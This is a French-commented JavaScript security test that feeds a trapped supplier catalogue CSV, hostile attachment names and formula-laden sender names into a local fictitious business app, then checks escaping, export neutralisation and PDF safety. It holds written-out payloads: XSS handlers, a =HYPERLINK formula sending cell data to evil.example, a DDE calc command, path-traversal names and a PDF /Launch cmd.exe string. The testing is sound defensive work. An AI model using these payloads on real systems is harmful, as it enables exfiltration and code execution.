// Angle « courrier » · sonde 3 : LES FICHIERS. Quatre entrées de fichier, quatre sorties :
//   1. l'import de catalogue d'un fournisseur (CSV) : charges dans la désignation, la référence, le code-barres, l'unité ; formules =, +, -, @ ;
//      champ de 100 000 caractères ; prix absurdes (1e999, -5, NaN) ; 20 000 lignes. On applique l'import puis on revisite les écrans ;
//   2. les noms de pièces jointes d'un courriel, TÉLÉCHARGÉS par le bouton du module : le nom proposé au navigateur est-il sûr ?
//   3. les EXPORTS (FEC du mois, coût des véhicules, frais d'un véhicule) : une valeur qui commence par = + - @ devient une formule chez le comptable.
//      La valeur hostile arrive par un geste : « C'est un client » sur un courriel dont le nom d'expéditeur est une formule ;
//   4. ce que le courriel ajoute aux fiches (« Ranger la pièce jointe », « Ajouter aux photos de l'intervention »).
// Chaque contrôle compte d'abord sa population. ⛔ 127.0.0.1, entreprise fictive. « N ✓ · M ✗ », sortie 1 si un contrôle tombe.
const L = require('../lib.js'), O = require('./injection-outils.js'), fs = require('fs');
const CAP = '/tmp/claude-0/-home-user-teamop/8050f26e-cdde-5a38-bb11-ba578db16f81/scratchpad/cap/courrier/';
const CSVF = CAP + 'catalogue-piege.csv';
const FORMULE = '=HYPERLINK("https://evil.example/?d="&A2;"Voir la facture")';
(async () => {
  fs.mkdirSync(CAP, { recursive: true });
  // ── le fichier de prix piégé ──
  const ch = (id) => O.CHARGE(id), en = id => `¤${id}¤&quot;&#39;&gt;&lt;img src=x onerror=&quot;__xss(&#39;${id}&#39;)&quot;&gt;`;
  const q = t => '"' + String(t).replace(/"/g, '""') + '"';   // un champ entre guillemets : la charge contient « ; » et « " », elle doit rester DANS sa colonne
  const lignes = ['Désignation;Référence;EAN;Prix net;Unité',
    `${q(ch('n201'))};${q(ch('n202'))};${q(ch('n203'))};12,50;${q(ch('n204'))}`,
    `${q(en('n211'))};${q(en('n212'))};${q(en('n213'))};13,50;${q(en('n214'))}`,
    `${q(FORMULE)};${q("+cmd|' /C calc'!A0")};-2+3;99,00;@SUM(1+1)`,
    `Article géant ${'G'.repeat(100000)};GEANT;3000000000001;5,00;u`,
    'Prix absurde 1;P1;3000000000011;1e999;u', 'Prix absurde 2;P2;3000000000012;-5;u', 'Prix absurde 3;P3;3000000000013;NaN;u', 'Prix absurde 4;P4;3000000000014;99999999999999999999999;u', 'Prix absurde 5;P5;3000000000015;1,5,5;u'];
  for (let i = 0; i < 20000; i++) lignes.push(`Remplissage ${i};ZZ${i};${3100000000000 + i};${(1 + i % 90).toFixed(2).replace('.', ',')};u`);
  fs.writeFileSync(CSVF, lignes.join('\r\n'));
  const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 1500, init: O.INIT }), p = c.p;
  p.on('dialog', d => d.accept().catch(() => {}));
  const dehors = []; p.on('request', r => { const u = r.url(); if (!/^(http:\/\/127\.0\.0\.1|data:|blob:|about:)/.test(u)) dehors.push(u.slice(0, 100)); });
  // ── 2. les noms de pièces jointes, téléchargés ──
  const NOMS = ['../../../etc/passwd.pdf', '..\\..\\Windows\\win.ini.pdf', '\u202efdp.exe', 'con.pdf', 'facture.pdf\u0000.exe', 'a'.repeat(600) + '.pdf', '/etc/cron.d/x.pdf', 'C:\\x\\y.pdf', '.bashrc', 'x.pdf '.repeat(3), '<img src=x onerror=1>.pdf', 'faux\u2066pdf.exe'];
  await p.evaluate(N => { N.forEach((n, i) => MAILS.push(mlM('nf' + i, AUJ, '11:5' + (i % 10), { nom: 'Pièces ' + i, mail: 'pj' + i + '@exemple.fr' }, 'Pièce ' + i, 'Voir la pièce jointe.', { pj: [[n, '1 Ko']] }))); }, NOMS);
  await p.evaluate(() => aller('boiteMail')); await L.attendre(p, () => COURRIER.etat === 'pret', 20000); await p.waitForTimeout(600);
  await p.evaluate(() => COURRIER.inst.rafraichir()); await p.waitForTimeout(800);
  const SR = "document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot", propos = [];
  // ⚠ Depuis la version où l'hôte intercepte tout clic sur un lien blob: (voirFichierLocal), un onglet ordinaire ne reçoit plus de téléchargement : l'événement « download » n'arrive plus (rapporté au chef de chantier).
  // On note donc, à la place, le NOM que le module donne à l'hôte (telechargerFichier(nom, blob)) : c'est lui, nettoyé par nomFichierSur, que le navigateur recevrait.
  await p.evaluate(() => { window.__dl = []; window.telechargerFichier = async (nom, data) => { window.__dl.push({ nom: String(nom), texte: typeof data === 'string' ? data : null, type: data && data.type }); return 'enregistre'; }; });
  for (let i = 0; i < NOMS.length; i++) {
    await p.evaluate(id => COURRIER.inst.ouvrir(id), 'nf' + i); await p.waitForTimeout(500);
    const avant = await p.evaluate(() => window.__dl.length);
    const clic = await p.evaluate(`(() => { const b = ${SR}.querySelector('.attbar [data-dl]'); if (!b) return false; b.click(); return true; })()`);
    await L.attendre(p, n => window.__dl.length > n, 15000, avant);
    const d = await p.evaluate(n => (window.__dl.length > n ? window.__dl[window.__dl.length - 1] : null), avant); propos.push({ i, clic, nom: d ? d.nom : null });
  }
  console.log('  · noms proposés :', JSON.stringify(propos.map(x => x.nom && x.nom.slice(0, 50))));
  L.v('population : les ' + NOMS.length + ' pièces piégées ont été téléchargées (' + propos.filter(x => x.nom).length + ')', propos.filter(x => x.nom).length === NOMS.length, propos.filter(x => !x.nom));
  const mauvais = propos.filter(x => x.nom && (/[\\\/:*?"<>|]/.test(x.nom) || /[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069\u200b-\u200f]/.test(x.nom) || x.nom.length > 130 || /^\./.test(x.nom) || /^(con|prn|aux|nul)(\.|$)/i.test(x.nom) || /\s$/.test(x.nom)));
  L.v('chaque nom de fichier proposé est sûr : pas de chemin, de caractère de contrôle, de sens d\'écriture inversé, de nom réservé de Windows, ni plus de 130 signes', mauvais.length === 0, mauvais.map(x => x.nom.slice(0, 50)));
  // ── 2 bis. le PDF fabriqué à partir d'un courriel (pièce « .pdf » téléchargée) : le texte d'un inconnu ne sort pas de sa chaîne PDF ──
  const PDFT = await p.evaluate(() => { const lignes = ['a) Tj ET q 0 0 m 9999 9999 l S Q BT /F1 99 Tf (INJECTE', 'b\\) \\\\ ( \\( ))) (((', 'c\u0000\u0007\u001b[31m d', '/Launch /Action << /S /Launch /F (cmd.exe) >>'];
    const octets = pdfUnePage('Titre ) Tj ET (piege', lignes); const t = typeof octets === 'string' ? octets : new TextDecoder('latin1').decode(octets);
    const flux = t.split('\n').filter(l => /^BT /.test(l)), ok = /^BT \/F\d+ [\d.]+ Tf [\d. ]+ rg [\d.-]+ [\d.-]+ Td \((?:[^()\\\r\n]|\\.)*\) Tj ET$/, mauvaises = flux.filter(l => !ok.test(l));
    return { n: flux.length, mauvaises: mauvaises.slice(0, 3), objets: (t.replace(/\((?:[^()\\]|\\.)*\)/g, '()').match(/\/Launch|\/JavaScript|\/JS |\/OpenAction|\/EmbeddedFile/g) || []).length };   /* hors des chaînes : un « /Launch » ÉCRIT dans un texte est inerte */ });
  console.log('  · PDF fabriqué :', JSON.stringify(PDFT));
  L.v('population : le PDF d\'essai contient des lignes de texte (' + PDFT.n + ')', PDFT.n >= 4, PDFT);
  L.v('le texte piégé (parenthèses, barres obliques, caractères de contrôle) reste DANS sa chaîne PDF : chaque ligne est « BT … ( texte échappé ) Tj ET »', PDFT.mauvaises.length === 0, PDFT.mauvaises);
  L.v('aucune action PDF (/Launch, /JavaScript, /OpenAction, /EmbeddedFile) n\'est née du texte', PDFT.objets === 0, PDFT);
  // ── 3. les exports : une valeur qui commence par = + - @ ──
  // 3a. la valeur hostile ARRIVE par un geste : « C'est un client » sur un courriel dont le nom d'expéditeur est une formule
  await p.evaluate(F => { MAILS.push(mlM('nExp', AUJ, '12:01', { nom: F, mail: 'formule@exemple.fr' }, 'Bonjour', 'Je souhaite un devis pour une climatisation. Tél. : 06 45 67 89 01')); }, FORMULE);
  await p.evaluate(() => COURRIER.inst.rafraichir()); await p.waitForTimeout(700); await p.evaluate(() => COURRIER.inst.ouvrir('nExp')); await p.waitForTimeout(600);
  const cliqueC = await p.evaluate(`(() => { const b = ${SR}.querySelector('.hband [data-hote="mbx:devis|nExp"]') || ${SR}.querySelector('.hband [data-hote="mbx:cestclient|nExp"]'); if (!b) return false; b.click(); return true; })()`); await p.waitForTimeout(600);
  await p.evaluate(() => { const b = document.querySelector('#calque [data-mbx^="devfait"]'); if (b) b.click(); }); await p.waitForTimeout(700); await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} });
  const nomClient = await p.evaluate(() => { const k = Object.keys(CLIENTS).find(k => CLIENTS[k].mail === 'formule@exemple.fr'); return k ? { k, nom: CLIENTS[k].nom } : null; });
  L.v('population : « C\'est un client » a créé la fiche d\'un client dont le nom est la formule', cliqueC && nomClient && nomClient.nom === FORMULE, nomClient);
  console.log('  · le nom d\'expéditeur est devenu le nom du client tel quel :', nomClient && nomClient.nom.slice(0, 60));
  // 3b. le FEC du mois : le client (avec une écriture) part dans la colonne CompAuxLib
  await p.evaluate(() => aller('factures')); await p.waitForTimeout(1200);
  const fec = await p.evaluate(FORM => { const k = Object.keys(CLIENTS).find(k => CLIENTS[k].mail === 'formule@exemple.fr'); const ancien = FACTURES.find(f => f.num !== '—' && f.st !== 'brouillon'); const cli0 = ancien.cli; ancien.cli = k; let t; try { t = cpFec(); } catch (e) { t = 'ERREUR ' + e.message; } ancien.cli = cli0; if (/^ERREUR/.test(t)) return { erreur: t, lignes: 0, cellules: [], debute: [] };
    const cell = t.split('\r\n').flatMap(l => l.split('\t')).filter(c => c.includes('HYPERLINK')); return { lignes: t.split('\r\n').length, cellules: cell.slice(0, 3), debute: cell.map(c => c[0]) }; }, FORMULE);
  console.log('  · FEC :', JSON.stringify(fec).slice(0, 300));
  L.v('population : le FEC du mois a des écritures et contient le nom du client piégé (' + fec.cellules.length + ' cellules)', fec.lignes > 5 && fec.cellules.length >= 1, fec);
  L.v('3b. FEC : aucune cellule ne commence par = + @ (formule chez le comptable) : on neutralise par une apostrophe ou une espace', fec.cellules.every(c => !/^[=+@\t\r-]/.test(c)), fec.cellules.map(c => c.slice(0, 40)));
  // 3c. les deux tableaux du module Véhicules
  const veh = await p.evaluate(async FORM => { const out = {}; const v = VEHICULES[0], ancienNom = v.plaque; window.__dl = [];
    out.diag = { fonctions: [typeof vhCsvFlotte, typeof vxCsv], vehicules: VEHICULES.length, v0: v && v.id };
    v.plaque = FORM; try { vhCsvFlotte(); } catch (e) { out.err = e.message; }
    try { v.frais = v.frais || []; v.frais.push([AUJ, FORM, 10]); vxCsv(v.id); } catch (e) { out.err2 = e.message; }
    await new Promise(r => setTimeout(r, 400)); v.plaque = ancienNom;   // l'hôte reçoit (nom, texte) après un await : on lui laisse le temps
    out.n = window.__dl.length; out.csv = window.__dl.map(x => String(x.texte || '').split('\r\n').map(l => l.split(';')).flat().filter(c => c.includes('HYPERLINK')).map(c => c.slice(0, 60)));
    return out; }, FORMULE);
  console.log('  · tableaux Véhicules :', JSON.stringify(veh).slice(0, 400));
  L.v('population : les deux exports CSV de Véhicules ont été produits (' + veh.n + ') et contiennent la valeur piégée', veh.n >= 2 && veh.csv.flat().length >= 1, veh);
  L.v('3c. CSV : aucune cellule ne commence par = + @ — ni derrière les guillemets (Excel évalue aussi "=…")', veh.csv.flat().every(c => !/^"?[=+@\t\r]/.test(c)), veh.csv.flat());
  // ── 1 (en dernier). l'import de catalogue : après 20 000 articles la page est lourde (téléchargements et exports ne partaient plus : rejoué avant, ils partent) ──
  await p.evaluate(() => aller('produits')); await p.waitForTimeout(600);
  const nAvant = await p.evaluate(() => PRODUITS.length);
  await p.evaluate(() => fournTarifs(MES_FOURN.find(o => o.dir) ? MES_FOURN.find(o => o.dir).id : MES_FOURN[0].id)); await p.waitForTimeout(600);
  const champ = p.locator('[data-fofile]').first();
  L.v('population : le champ « Choisir le fichier » du catalogue est là', await champ.count() === 1);
  const t0 = Date.now(); await champ.setInputFiles(CSVF);
  const prete = await L.attendre(p, () => !!document.querySelector('[data-foimp]'), 60000); const tAnalyse = Date.now() - t0;
  L.v('population : le fichier piégé de ' + Math.round(fs.statSync(CSVF).size / 1024) + ' Ko est lu et la vérification s\'affiche (en ' + tAnalyse + ' ms)', prete, tAnalyse);
  L.v('un fichier de 20 000 lignes se lit en moins de 8 secondes (sinon la page se fige : ' + tAnalyse + ' ms)', tAnalyse < 8000, tAnalyse);
  const V = await p.evaluate(O.LIRE);
  console.log('  · à la vérification : ', V.sorti.length, 'sorties ;', V.vues.length, 'charges vues échappées');
  L.v('population : les charges du fichier sont arrivées à l\'écran de vérification (échappées)', V.vues.length >= 2 || (await p.evaluate(() => document.querySelectorAll('[data-foimp]').length)) >= 10, V.vues);
  L.v('la vérification n\'a laissé sortir AUCUNE charge du fichier (balise, gestionnaire)', V.sorti.length === 0, V.sorti.slice(0, 6));
  const lu = await p.evaluate(() => { const r = [...document.querySelectorAll('.fo-r')]; return { lignes: r.length, premiere: (r[0] ? r[0].textContent : '').slice(0, 120), aCharge: r.some(x => /¤n20\d¤/.test(x.textContent) || /¤n21\d¤/.test(x.textContent)) }; });
  console.log('  · écran de vérification :', JSON.stringify(lu));
  L.v('population : les lignes du fichier piégé s\'affichent à la vérification, charges comprises, en TEXTE (' + lu.lignes + ' lignes)', lu.lignes >= 3 && lu.aCharge, lu);
  const nImp = await p.evaluate(() => { document.querySelectorAll('[data-foimp]').forEach(i => { if (!i.checked) i.click(); }); return document.querySelectorAll('[data-foimp]:checked').length; });
  L.v('population : lignes cochées pour l\'import (' + nImp + ')', nImp >= 20, nImp);
  const t1 = Date.now(); await p.evaluate(() => { const b = document.querySelector('[data-fo="appliquer"]'); if (b) { b.disabled = false; b.click(); } }); await p.waitForTimeout(2500); const tAppl = Date.now() - t1;
  const A = await p.evaluate(() => { const n = PRODUITS.length; const x = {}; PRODUITS.forEach(o => { if (/¤n\d+¤|HYPERLINK|^[=+@]/.test(o.nom + '|' + o.ref + '|' + o.u + '|' + o.ean)) x[o.id] = { nom: String(o.nom).slice(0, 40), nomLen: String(o.nom).length, ref: String(o.ref).slice(0, 30), u: String(o.u).slice(0, 30), pa: o.pa, pv: o.pv }; });
    const pas = PRODUITS.filter(o => o.pa != null && (!isFinite(o.pa) || o.pa < 0 || o.pa > 1e7)).map(o => ({ nom: String(o.nom).slice(0, 30), pa: String(o.pa) })); return { n, x, pas, maxNom: Math.max(...PRODUITS.map(o => String(o.nom).length)) }; });
  console.log('  · produits :', nAvant, '→', A.n, '· posés avec une charge ou une formule :', Object.keys(A.x).length, '· plus long nom :', A.maxNom, '· import appliqué en', tAppl, 'ms');
  L.v('population : l\'import a créé des produits (' + (A.n - nAvant) + ')', A.n - nAvant >= 3, A.n - nAvant);
  L.v('population : des produits portant une charge ou une formule sont dans le catalogue', Object.keys(A.x).length >= 3, A.x);
  L.v('aucun prix infini, négatif ou absurde (> 10 000 000) n\'est entré dans le catalogue', A.pas.length === 0, A.pas.slice(0, 5));
  L.v('le nom d\'un article reste borné (≤ 500 caractères) : le plus long vaut ' + A.maxNom, A.maxNom <= 500, A.maxNom);
  const unites = Object.values(A.x).filter(x => x.u && !/^[\p{L}\p{N}\/².³°µ%. -]{1,12}$/u.test(x.u));
  L.v('l\'unité venue du fichier est une unité (12 signes au plus : lettres, chiffres, / ² ³ ° µ % . -) — sinon elle atteint le Stock brute (injection-02) : ' + JSON.stringify(unites.map(x => x.u.slice(0, 18))), unites.length === 0, unites.slice(0, 3));
  // balayage : tous les écrans qui montrent le catalogue
  const routes = await p.evaluate(() => Object.keys(vues()).filter(r => !/-x-/.test(r)));
  const trouves = new Map(), vusT = new Set(); let nEcrans = 0;
  for (const r of routes) { try { await Promise.race([p.evaluate(x => aller(x), r), new Promise((_, q) => setTimeout(() => q(new Error('DELAI')), 9000))]); } catch (e) { continue; }
    await p.waitForTimeout(300); nEcrans++; let R; try { R = await p.evaluate(O.LIRE); } catch (e) { continue; } R.vues.forEach(v => vusT.add(v)); R.sorti.forEach(s => { const k = s.sorte + '|' + s.champ; if (!trouves.has(k)) trouves.set(k, { ...s, ou: r }); });
    await p.evaluate(() => { try { fermerPanneau(); } catch (e) {} }); }
  const H = await p.evaluate(() => (window.top.__hits || []).slice());
  L.v('population : ≥ 30 écrans revisités après l\'import (' + nEcrans + ')', nEcrans >= 30, nEcrans);
  L.v('AUCUNE charge du fichier de prix n\'est sortie de son texte dans les ' + nEcrans + ' écrans — sorties : ' + trouves.size, trouves.size === 0, [...trouves.values()].slice(0, 6).map(s => s.champ + ' ▸ ' + s.sorte + ' ▸ ' + s.ou));
  L.v('AUCUN code exécuté depuis le fichier de prix (window.__hits : ' + H.length + ')', H.length === 0, H.slice(0, 6));
  // ── 4. ce que le courriel ajoute aux fiches ──
  const lg = await p.evaluate(() => (window.top.__hits || []).length);
  L.v('aucune requête vers un autre hôte que 127.0.0.1', dehors.length === 0, dehors.slice(0, 4));
  const nErr = c.err.filter(e => !/ResizeObserver/.test(e)); L.v('aucune erreur de page', nErr.length === 0, nErr.slice(0, 3));
  const ko = L.bilan(); await L.fin(c); await L.fermer(); try { fs.unlinkSync(CSVF); } catch (e) {} process.exit(ko ? 1 : 0);
})().catch(async e => { console.error('SONDE EN PANNE', e); try { await L.fermer(); } catch (x) {} process.exit(2); });
